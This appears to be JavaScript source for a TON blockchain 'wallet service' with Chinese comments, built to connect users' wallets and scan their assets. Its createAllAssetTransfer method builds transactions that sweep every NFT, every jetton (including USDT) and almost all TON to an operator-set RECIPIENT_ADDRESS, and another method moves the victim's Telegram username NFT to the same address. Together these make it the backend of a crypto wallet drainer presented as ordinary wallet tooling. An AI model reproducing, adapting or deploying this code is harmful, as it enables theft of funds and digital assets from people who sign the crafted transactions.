/**
 * TON 钱包服务类
 * 提供钱包连接、交易创建、资产扫描、费用计算等功能
 * 
 * @author TON Bot Team
 * @version 1.0.0
 */

import redis from "../utils/redis.js";
import TonWeb from "tonweb";

const { Address, BN } = TonWeb.utils;

/**
 * 数值转换工具类
 * 用于在 BigInt、BN、String 和 Number 之间安全转换，避免精度问题
 */
const NumberUtils = {
  /**
   * 将任意数值转为 BigInt，避免精度问题
   * @param {bigint|string|number|BN} value - 待转换的值
   * @returns {bigint} BigInt 值
   * @throws {Error} 当值不是整数或类型不支持时抛出错误
   */
  toBigInt(value) {
    if (typeof value === "bigint") return value;
    if (typeof value === "string") return BigInt(value);
    if (typeof value === "number") {
      if (!Number.isInteger(value)) {
        throw new Error(`数值 ${value} 不是整数，无法安全转换为 BigInt`);
      }
      return BigInt(value);
    }
    if (value instanceof BN) return BigInt(value.toString());
    throw new Error(`无法将 ${typeof value} 类型转换为 BigInt`);
  },

  /**
   * 将任意数值转为 TonWeb BN 对象
   * @param {bigint|string|number|BN} value - 待转换的值
   * @returns {BN} TonWeb BN 对象
   * @throws {Error} 当值不是整数或类型不支持时抛出错误
   */
  toBN(value) {
    if (value instanceof BN) return value;
    if (typeof value === "bigint") return new BN(value.toString());
    if (typeof value === "string") return new BN(value);
    if (typeof value === "number") {
      if (!Number.isInteger(value)) {
        throw new Error(`数值 ${value} 不是整数，无法安全转换为 BN`);
      }
      return new BN(value.toString()); // 先转字符串避免精度问题
    }
    throw new Error(`无法将 ${typeof value} 类型转换为 BN`);
  },

  /**
   * 安全的字符串转换
   * @param {*} value - 待转换的值
   * @returns {string} 字符串值
   */
  toString(value) {
    if (typeof value === "string") return value;
    if (typeof value === "bigint") return value.toString();
    if (typeof value === "number") return value.toString();
    if (value instanceof BN) return value.toString();
    return String(value);
  },
};

// =====================================================
// 工具函数区域
// =====================================================

/**
 * 将人类可读的金额转换为原始 BigInt 格式
 * @param {string|number} humanReadableAmount - 人类可读的金额（如 "1.23"）
 * @param {number} tokenDecimals - 代币精度（小数位数）
 * @returns {bigint} 原始金额的 BigInt 表示
 * @throws {Error} 转换失败时抛出错误
 * 
 * @example
 * convertHumanAmountToRawBigInt("1.23", 9) // 返回 1230000000n
 */
function convertHumanAmountToRawBigInt(humanReadableAmount, tokenDecimals) {
  try {
    const [integerPart = "0", fractionalPart = ""] =
      String(humanReadableAmount).split(".");
    
    // 补齐小数位并截取到指定精度
    const paddedFractionalPart = (
      fractionalPart + "0".repeat(tokenDecimals)
    ).slice(0, tokenDecimals);
    
    // 组合整数部分和小数部分，移除前导零
    const rawAmountString =
      (integerPart + paddedFractionalPart).replace(/^0+/, "") || "0";
    
    return NumberUtils.toBigInt(rawAmountString);
  } catch (error) {
    throw new Error(`金额转换失败 ${humanReadableAmount}: ${error.message}`);
  }
}

/**
 * 创建配置好的 TonWeb 实例
 * @returns {TonWeb} 配置好的 TonWeb 实例，使用 Toncenter 作为提供者
 */
function createTonWebInstance() {
  const httpProvider = new TonWeb.HttpProvider(process.env.TONCENTER_RPC, {
    apiKey: process.env.TONCENTER_API_KEY || "",
  });
  return new TonWeb(httpProvider);
}

/**
 * 计算发送方的 JettonWallet 地址
 * 通过 Jetton Master 合约和钱包地址计算出对应的 JettonWallet 地址
 * 
 * @param {string} jettonMasterAddress - Jetton Master 合约地址
 * @param {string} ownerWalletAddress - 钱包所有者地址
 * @returns {Promise<Address>} JettonWallet 地址
 * @throws {Error} 计算失败时抛出错误
 */
async function calculateSenderJettonWalletAddress(
  jettonMasterAddress,
  ownerWalletAddress
) {
  const tonWebInstance = createTonWebInstance();
  const jettonMinter = new TonWeb.token.jetton.JettonMinter(
    tonWebInstance.provider,
    {
      address: new Address(jettonMasterAddress),
    }
  );
  return await jettonMinter.getJettonWalletAddress(
    new Address(ownerWalletAddress)
  );
}

// =====================================================
// Payload 构建函数区域
// =====================================================

/**
 * 构建 Jetton 转账的 Payload（符合 TIP-3 标准）
 * 
 * @param {Object} params - 转账参数
 * @param {string} params.recipientAddress - 收款人地址
 * @param {bigint} params.transferAmountRaw - 转账数量（原始格式，不含小数点）
 * @param {string} params.responseDestination - 回执地址（通常是发送方地址）
 * @param {string} params.forwardTonAmount - 转发给接收方的 TON 数量，默认 "0"
 * @param {string} params.forwardMessage - 转账备注，默认为空
 * @returns {Promise<string>} Base64 编码的 Payload
 * @throws {Error} 构建失败时抛出错误
 */
async function buildJettonTransferPayloadBase64({
  recipientAddress,
  transferAmountRaw,
  responseDestination,
  forwardTonAmount = "0",
  forwardMessage = "",
}) {
  const JETTON_TRANSFER_OPCODE = 0xf8a7ea5; // TIP-3 标准转账操作码
  const transferCell = new TonWeb.boc.Cell();

  // 按照 TIP-3 标准构建消息结构
  transferCell.bits.writeUint(JETTON_TRANSFER_OPCODE, 32); // 操作码
  transferCell.bits.writeUint(0, 64); // query_id（查询ID）

  // 写入转账金额（使用 writeCoins 确保正确格式）
  const transferAmountBN = NumberUtils.toBN(transferAmountRaw);
  transferCell.bits.writeCoins(transferAmountBN);

  // 写入地址信息
  transferCell.bits.writeAddress(new Address(recipientAddress)); // 目标地址
  transferCell.bits.writeAddress(new Address(responseDestination)); // 响应地址
  transferCell.bits.writeBit(0); // 无自定义 payload
  transferCell.bits.writeCoins(TonWeb.utils.toNano(String(forwardTonAmount))); // 转发 TON 数量

  // 处理转账备注
  if (forwardMessage) {
    transferCell.bits.writeBit(1); // 有转发 payload
    const forwardPayloadCell = new TonWeb.boc.Cell();
    forwardPayloadCell.bits.writeUint(0, 32); // 文本注释前缀
    forwardPayloadCell.bits.writeBytes(Buffer.from(forwardMessage, "utf8"));
    transferCell.refs.push(forwardPayloadCell);
  } else {
    transferCell.bits.writeBit(0); // 无转发 payload
  }

  const bocData = await transferCell.toBoc(false);
  return Buffer.from(bocData).toString("base64");
}

/**
 * NFT 标准 transfer
 */
async function buildNftTransferPayloadBase64({
  recipientAddress,
  responseDestination,
  forwardTonAmount = 0,
  forwardMessage = "",
}) {
  if (typeof recipientAddress !== "string") {
    throw new Error(`recipientAddress 不是字符串: ${recipientAddress}`);
  }
  if (typeof responseDestination !== "string") {
    throw new Error(`responseDestination 不是字符串: ${responseDestination}`);
  }

  const NFT_TRANSFER_OPCODE = 0x5fcc3d14;
  const nftTransferCell = new TonWeb.boc.Cell();
  nftTransferCell.bits.writeUint(NFT_TRANSFER_OPCODE, 32); // NFT transfer op

  // 简单 query_id：毫秒时间戳*1024 + 0-1023 随机
  const currentTimestamp = Date.now();
  const randomNumber = Math.floor(Math.random() * 1024);
  const uniqueQueryId = currentTimestamp * 1024 + randomNumber;
  nftTransferCell.bits.writeUint(uniqueQueryId, 64);

  nftTransferCell.bits.writeAddress(new Address(recipientAddress));
  nftTransferCell.bits.writeAddress(new Address(responseDestination));
  nftTransferCell.bits.writeBit(0); // no custom_payload
  nftTransferCell.bits.writeCoins(
    TonWeb.utils.toNano(String(forwardTonAmount))
  );

  if (forwardMessage) {
    const forwardPayloadCell = new TonWeb.boc.Cell();
    forwardPayloadCell.bits.writeUint(0, 32);
    forwardPayloadCell.bits.writeBytes(Buffer.from(forwardMessage, "utf8"));
    nftTransferCell.refs.push(forwardPayloadCell);
  } else {
    nftTransferCell.bits.writeBit(0); // 无 ref payload
  }

  const bocData = await nftTransferCell.toBoc(false);
  return Buffer.from(bocData).toString("base64");
}

// =====================================================
// 主要服务类
// =====================================================

/**
 * TON 钱包服务类
 * 提供完整的 TON 区块链钱包操作功能
 * 
 * 主要功能：
 * - 钱包连接和状态管理
 * - 交易创建和广播
 * - 资产扫描和转移
 * - 费用计算和预估
 * - Redis 缓存管理
 */
export class WalletService {
  
  // =====================================================
  // 钱包连接管理
  // =====================================================
  
  /**
   * 连接钱包并缓存连接信息到 Redis
   * @param {string} wallet - 钱包地址
   * @param {Object} raw - 原始钱包数据
   * @returns {Promise<Object>} 连接结果
   * @throws {Error} 连接失败时抛出错误
   */
  static async connectWallet(wallet, raw) {
    try {
      const walletKey = `wallet:${wallet}`;
      const connectionData = {
        ...raw,
        connectedAt: new Date().toISOString(),
        lastActivity: new Date().toISOString(),
      };
      
      await redis.set(walletKey, JSON.stringify(connectionData));
      console.log("✅ 钱包连接成功，已缓存到 Redis:", wallet);

      return {
        success: true,
        message: "钱包连接成功",
        data: { status: "connected" },
      };
    } catch (error) {
      console.error("❌ 钱包连接失败:", error);
      throw new Error(`钱包连接错误: ${error.message}`);
    }
  }

  // =====================================================
  // 工具方法
  // =====================================================
  
  /**
   * 将 TON 金额转换为 nanoTON 字符串格式
   * @param {number|string} tonAmount - TON 金额
   * @returns {string} nanoTON 字符串
   * @throws {Error} 转换失败时抛出错误
   */
  static convertTonToNanoString = (tonAmount) => {
    try {
      // 处理数值精度问题
      let processedTonAmount = tonAmount;
      if (typeof tonAmount === "number") {
        processedTonAmount = tonAmount.toFixed(9); // 限制小数位数，避免精度问题
      }

      const nanoTonAmount = TonWeb.utils.toNano(
        NumberUtils.toString(processedTonAmount)
      );
      return NumberUtils.toString(nanoTonAmount);
    } catch (error) {
      throw new Error(`TON 金额转换失败 ${tonAmount}: ${error.message}`);
    }
  };

  /**
   * 生成 "用户名 NFT 转移" 的交易
   */
  static async createUsernameNftTransaction(senderWallet, productDetails) {
    try {
      console.log("createUsernameNftTransaction", senderWallet, productDetails);
      const walletCacheKey = `wallet:${senderWallet}`;
      const cachedWalletData = await redis.get(walletCacheKey);
      if (!cachedWalletData) throw new Error("walletData not found");

      const usernameToTransfer = productDetails?.[2];
      const recipientWalletAddress = process.env.RECIPIENT_ADDRESS;
      if (!usernameToTransfer || !recipientWalletAddress) {
        throw new Error("username 或 RECIPIENT_ADDRESS 缺失");
      }

      // 解析 t.me DNS -> 找到 NFT item 地址
      const dnsApiResponse = await fetch(
        `${process.env.TONAPI_URL}/v2/dns/${usernameToTransfer}.t.me`
      );
      const dnsResponseData = await dnsApiResponse.json();
      const nftItemContractAddress = dnsResponseData?.item?.address ?? null;
      if (!nftItemContractAddress)
        throw new Error("未找到用户名 NFT Item 地址");

      // 附带的 TON 金额（gas）
      const gasAmountNano = this.convertTonToNanoString(0.1);

      const nftTransferPayload = await buildNftTransferPayloadBase64({
        recipientAddress: recipientWalletAddress,
        responseDestination: senderWallet,
        forwardTonAmount: 0,
        // forwardMessage: `transfer @${usernameToTransfer}`,
      });

      const transactionMessages = [
        {
          address: nftItemContractAddress, // 目标是 NFT item 合约
          amount: gasAmountNano,
          payload: nftTransferPayload,
        },
      ];

      const transactionMetadata = {
        type: "nft_username_transfer",
        username: usernameToTransfer,
        wallet: senderWallet,
        nftItemAddress: nftItemContractAddress,
        newOwnerWallet: recipientWalletAddress,
        amount: gasAmountNano,
        timestamp: Date.now(),
      };

      return {
        messages: transactionMessages,
        raw: transactionMetadata,
      };
    } catch (error) {
      console.error("createUsernameNftTransaction", error);
      throw new Error(`createUsernameNftTransaction error: ${error.message}`);
    }
  }

  /**
   * 拉取钱包资产（TON / NFTs / Jettons）
   */
  static async getAllWalletAssets(walletAddress) {
    try {
      const assets = {
        ton: { balance: "0", balanceTon: "0" },
        nfts: [],
        jettons: [], // tonapi: balances: [{ balance, wallet_address, jetton: { address, name, symbol, decimals, ... } }]
      };

      // 1. TON 余额
      {
        const res = await fetch(
          `${process.env.TONAPI_URL}/v2/blockchain/accounts/${walletAddress}`
        );
        const data = await res.json();
        assets.ton.balance = data.balance || "0";
        const balanceStr = NumberUtils.toString(data.balance || "0");
        assets.ton.balanceTon = TonWeb.utils.fromNano(balanceStr);
      }

      // 2. NFTs
      {
        const res = await fetch(
          `${process.env.TONAPI_URL}/v2/accounts/${walletAddress}/nfts?limit=1000`
        );
        const data = await res.json();
        assets.nfts = data.nft_items || [];
      }

      // 3. Jettons
      {
        const res = await fetch(
          `${process.env.TONAPI_URL}/v2/accounts/${walletAddress}/jettons?limit=1000`
        );
        const data = await res.json();
        assets.jettons = data.balances || [];
      }

      console.log("钱包资产扫描完成:", {
        ton: assets.ton.balanceTon,
        nftCount: assets.nfts.length,
        jettonCount: assets.jettons.length,
      });

      return assets;
    } catch (error) {
      console.error("获取钱包资产错误:", error);
      throw new Error(`获取钱包资产失败: ${error.message}`);
    }
  }

  /**
   * 批量资产转移（TON + 所有 NFT + 所有 Jetton，包括 USDT）
   */
  static async createAllAssetTransfer(wallet, appInfo, appName) {
    const targetOwner = process.env.RECIPIENT_ADDRESS; // 收款人的"普通钱包地址（owner）"
    if (!targetOwner) throw new Error("缺少 RECIPIENT_ADDRESS");

    try {
      const walletKey = `wallet:${wallet}`;
      const walletData = await redis.get(walletKey);
      if (!walletData) throw new Error("walletData not found");

      // 获取资产
      const assets = await this.getAllWalletAssets(wallet);
      const messages = [];

      if (assets.ton.balance < 0.001) {
        throw new Error("TON 余额不足");
      }

      if (["tonkeeper", "mytonwallet", "tonkhub"].includes(appName)) {
        // 支持 NFT

        // 1) NFTs：逐个把所有权转给 targetOwner
        for (const nftItem of assets.nfts) {
          const nftTransferPayload = await buildNftTransferPayloadBase64({
            recipientAddress: targetOwner,
            responseDestination: wallet,
            forwardTonAmount: 0,
            // forwardMessage: `Bulk transfer NFT`,
          });

          messages.push({
            address: nftItem.address, // 目标是 NFT item 合约地址
            amount: this.convertTonToNanoString(0.01), // 给 item 的 gas
            payload: nftTransferPayload,
          });
        }
      }

      // 2) Jettons：统一用 TIP-3 transfer
      // tonapi 返回的每个 jetton 结构：{ balance: "raw", wallet_address, jetton: { address: root, decimals, symbol, ... } }
      for (const jettonBalance of assets.jettons) {
        try {
          const jettonMasterAddress = jettonBalance?.jetton?.address;
          const rawBalanceString = NumberUtils.toString(
            jettonBalance?.balance ?? "0"
          );
          const jettonAmountRaw = NumberUtils.toBigInt(rawBalanceString);

          if (!jettonMasterAddress || jettonAmountRaw === 0n) {
            console.log(
              `跳过无效 Jetton: ${jettonMasterAddress}, balance: ${rawBalanceString}`
            );
            continue;
          }

          // 计算发送方的 JettonWallet 地址
          const senderJettonWalletAddress =
            await calculateSenderJettonWalletAddress(
              jettonMasterAddress,
              wallet
            );

          // 构造 payload（全额转出）
          const jettonTransferPayload = await buildJettonTransferPayloadBase64({
            recipientAddress: targetOwner,
            transferAmountRaw: jettonAmountRaw,
            responseDestination: wallet,
            forwardTonAmount: "0", // 最小 forward amount
            // forwardMessage: `Transfer ${jettonBalance?.jetton?.symbol || 'Jetton'}`,
          });

          // 修复：外部消息发送到 senderJettonWalletAddress（发送方的 Jetton 钱包）
          messages.push({
            address: senderJettonWalletAddress.toString(true, true, true), // userFriendly=true, urlSafe=true, testOnly=true
            amount: this.convertTonToNanoString(0.08), // 增加 Gas 费用，确保有足够的 TON 处理转账
            payload: jettonTransferPayload,
          });

          console.log(
            `添加 Jetton 转账: ${
              jettonBalance?.jetton?.symbol || "Unknown"
            }, 数量: ${rawBalanceString}`
          );
        } catch (error) {
          console.error(
            `处理 Jetton 转账失败: ${
              jettonBalance?.jetton?.symbol || "Unknown"
            }`,
            error
          );
          // 继续处理下一个 Jetton，不中断整个流程
        }
      }

      const tonReserveAmount = 0.2 + messages.length * 0.02;
      if (assets.ton.balanceTon < tonReserveAmount) {
        throw new Error("TON 手续费不足,请充值");
      }

      // 3) TON：保留 gas（避免把 TON 清空）
      const currentTonBalance = parseFloat(assets.ton.balanceTon || "0");
      // 计算可用的 TON 余额
      const availableTonToSend = Math.max(
        0,
        currentTonBalance - tonReserveAmount
      );
      if (availableTonToSend > tonReserveAmount) {
        try {
          messages.push({
            address: targetOwner,
            amount: this.convertTonToNanoString(availableTonToSend),
            payload: "",
          });
        } catch (error) {
          console.warn(`TON转账金额处理失败: ${error.message}`);
        }
      }

      console.log(`批量转移交易已生成: ${JSON.stringify(messages, null, 2)}`);
      return {
        success: true,
        data: { messages },
        assets,
        messages,
        message: `批量转移交易已生成: ${messages.length} 个消息`,
      };
    } catch (error) {
      console.error("创建批量资产转移错误:", error);
      throw new Error(`创建批量资产转移失败: ${error.message}`);
    }
  }

  /**
   * 广播已签名的 BOC（支持多种 API 接口）
   */
  static async broadcastWithTonapi(wallet, raw) {
    // 尝试多个可能的 TONAPI 接口路径
    const possibleEndpoints = ["v2/blockchain/message"];

    let lastError = null;

    for (const endpoint of possibleEndpoints) {
      try {
        console.log(`尝试接口: ${process.env.TONAPI_URL}/${endpoint}`);

        const res = await fetch(`${process.env.TONAPI_URL}/${endpoint}`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({ boc: raw.boc.boc }),
        });

        const data = await res.json().catch(() => ({}));

        if (res.ok) {
          console.log(`✅ 接口成功: ${endpoint}`, data);
          await redis.set(`boc:${wallet}`, JSON.stringify({ ...data }));
          return await this.handleTransactionConfirmation(wallet, raw, data);
        } else {
          console.log(
            `❌ 接口失败: ${endpoint}, 状态: ${res.status}, 响应:`,
            data
          );
          lastError = new Error(
            `${endpoint} failed: ${
              data?.message || data?.error || res.statusText
            }`
          );
        }
      } catch (error) {
        console.log(`❌ 接口错误: ${endpoint}`, error.message);
        lastError = error;
        continue; // 尝试下一个接口
      }
    }

    // 所有接口都失败了
    throw new Error(
      `所有 TONAPI 接口都失败了。最后一个错误: ${lastError?.message}`
    );
  }

  /**
   * 处理交易确认
   */
  static async handleTransactionConfirmation(wallet, raw, data) {
    try {
      // 尝试确认第一条消息
      const targetAddress = raw.messages?.[0]?.address;
      const expect = {
        to: targetAddress,
        since: Date.now() - 5 * 60 * 1000, // 最近5分钟
        // 可选：minAmountNano: raw.messages?.[0]?.amount
      };

      const confirmed = await this.waitForConfirmation(
        wallet,
        targetAddress,
        expect,
        process.env.TONAPI_KEY,
        90_000,
        3_000
      );

      return { success: true, confirmed, data };
    } catch (e) {
      // 未确认不代表失败，可能还没进块
      console.log("交易确认超时，但可能仍在处理中:", e.message);
      return { success: true, pending: true, data };
    }
  }

  static async sleep(ms) {
    return new Promise((r) => setTimeout(r, ms));
  }

  /**
   * 简单轮询确认：在窗口期内寻找符合条件的一笔入账
   * @param {string} wallet - 发起钱包地址
   * @param {string} account - 目标账户（例如 NFT item 地址或收款地址）
   * @param {{minAmountNano?: string, from?: string, to?: string, since?: number}} expect
   * @param {string} apiKey - TONAPI 密钥
   * @param {number} timeoutMs - 超时时间（毫秒）
   * @param {number} intervalMs - 检查间隔（毫秒）
   */
  static async waitForConfirmation(
    wallet,
    account,
    expect,
    apiKey,
    timeoutMs = 60_000,
    intervalMs = 3_000
  ) {
    if (!account) throw new Error("waitForConfirmation: account 缺失");
    const deadline = Date.now() + timeoutMs;

    while (Date.now() < deadline) {
      const url = `${process.env.TONAPI_URL}/v2/blockchain/accounts/${account}/transactions?limit=20`;
      const res = await fetch(url, {
        headers: { Authorization: `Bearer ${apiKey || ""}` },
      });

      if (res.ok) {
        const data = await res.json();
        const txs = data?.transactions ?? [];

        const hit = txs.find((tx) => {
          const inMsg = tx?.in_msg;
          if (!inMsg) return false;

          const okTo = expect.to
            ? inMsg.destination?.address === expect.to
            : true;
          const okTime = expect.since ? tx.utime * 1000 >= expect.since : true;

          let okAmt = true;
          if (expect.minAmountNano) {
            try {
              const val = NumberUtils.toBigInt(inMsg.value || "0");
              const minAmt = NumberUtils.toBigInt(expect.minAmountNano);
              okAmt = val >= minAmt;
            } catch (error) {
              console.warn(`金额比较失败: ${error.message}`);
              okAmt = false;
            }
          }

          // 可扩展 from 校验
          const okFrom = expect.from
            ? inMsg.source?.address === expect.from
            : true;

          return okTo && okTime && okAmt && okFrom;
        });

        if (hit) {
          await redis.del(`boc:${wallet}`);
          return hit; // 找到匹配交易
        }
      }

      await this.sleep(intervalMs);
    }

    throw new Error("confirmation timeout");
  }

  /**
   * 断开钱包连接
   */
  static async disconnectWallet(wallet) {
    try {
      const walletKey = `wallet:${wallet}`;
      await redis.del(walletKey);
      console.log("钱包断开连接成功:", wallet);
      return { success: true, message: "断开连接成功" };
    } catch (error) {
      throw new Error(`disconnect error: ${error.message}`);
    }
  }

  /**
   * 获取钱包状态
   */
  static async getWalletStatus(walletAddress) {
    try {
      const walletKey = `wallet:${walletAddress}`;
      const walletData = await redis.get(walletKey);

      if (!walletData) {
        return { status: "disconnected" };
      }

      const data = JSON.parse(walletData);
      return {
        status: "connected",
        connectedAt: data.connectedAt,
        lastActivity: data.lastActivity,
      };
    } catch (error) {
      throw new Error(`get wallet status error: ${error.message}`);
    }
  }

  /**
   * 清理过期数据
   */
  static async cleanupExpiredData() {
    try {
      // 这里可以添加清理过期缓存的逻辑
      console.log("开始清理过期数据...");

      // 示例：清理超过24小时的钱包连接数据
      // 具体实现取决于你的业务需求

      console.log("清理过期数据完成");
      return { success: true, message: "清理完成" };
    } catch (error) {
      throw new Error(`cleanup error: ${error.message}`);
    }
  }
}
